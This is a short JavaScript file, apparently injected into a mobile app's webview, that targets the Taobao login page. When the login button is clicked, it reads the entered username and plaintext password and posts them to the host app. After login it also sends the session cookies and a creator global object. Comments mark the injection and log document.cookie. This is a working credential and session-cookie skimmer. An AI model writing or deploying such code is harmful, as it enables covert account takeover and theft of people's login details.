// console.log("注入成功");
// console.log("登录时cookie" + document.cookie);
if (document.URL.indexOf('https://login.m.taobao.com/login.htm') != -1) {
	document.addEventListener('UniAppJSBridgeReady', function() {
		document.querySelector(".fm-btn").addEventListener('click', function(e) {
			// console.log("登录时cookie" + document.cookie);
			
			uni.postMessage({
				data: {
					action: 'postMessage',
					userName: document.getElementById("fm-login-id").value,
					password: document.getElementById("fm-login-password").value
				}
			});
		});
	});
} else if (CREATOR_GLOBAL) {
	// console.log("登录后cookie" + document.cookie);
	// console.log("登录后cookie" + plus.navigator.getCookie(document.URL));
	uni.postMessage({
		data: {
			code: 0,
			cookie: plus.navigator.getCookie(document.URL),
			creatorGlobal: JSON.stringify(CREATOR_GLOBAL)
		}
	});
}